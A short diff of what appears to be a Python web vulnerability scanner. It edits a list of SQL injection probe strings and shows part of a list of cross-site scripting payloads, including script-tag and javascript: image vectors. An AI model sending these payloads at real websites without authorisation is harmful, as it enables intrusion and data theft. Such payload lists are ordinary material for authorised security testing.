@@ -1,6 +1,6 @@
 import argparse, urllib, os, sys
 
-sqli = ["'", "' or 1=1#", "' or 1=1--", "'or 1=1/*", "' or 1=1;%00"]
+sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
 xss = ["';alert(String.fromCharCode(88,83,83))//", "\";alert(String.fromCharCode(88,83,83))//",
        "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "'';!--\"<XSS>=&{()}",
        "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>",
